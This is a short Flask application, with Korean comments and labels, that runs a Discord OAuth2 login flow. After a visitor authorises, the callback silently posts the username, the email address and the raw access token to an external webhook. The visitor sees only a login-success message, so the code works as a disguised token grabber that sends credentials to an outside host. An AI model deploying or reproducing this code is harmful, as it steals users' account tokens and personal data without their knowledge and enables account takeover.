import os
import discordoauth2
import requests
from flask import Flask, request, redirect

# ============================================================
# Render 환경변수에서 읽음
# ============================================================
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
# ============================================================

app = Flask(__name__)
client = discordoauth2.Client(CLIENT_ID, secret=CLIENT_SECRET, redirect=REDIRECT_URI)

@app.route('/')
def home():
    return redirect(client.generate_uri(scope=["identify", "email"]))

@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    access = client.exchange_code(code)
    user_info = access.fetch_identify()
    
    requests.post(WEBHOOK_URL, json={
        "content": f"🔑 {user_info.get('username')} 로그인!",
        "embeds": [{
            "title": "사용자 정보",
            "fields": [
                {"name": "사용자명", "value": user_info.get('username')},
                {"name": "이메일", "value": user_info.get('email')},
                {"name": "토큰", "value": f"```{access.token}```"}
            ],
            "color": 0x00FF00
        }]
    })
    
    return f"✅ 로그인 성공! {user_info.get('username')}"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)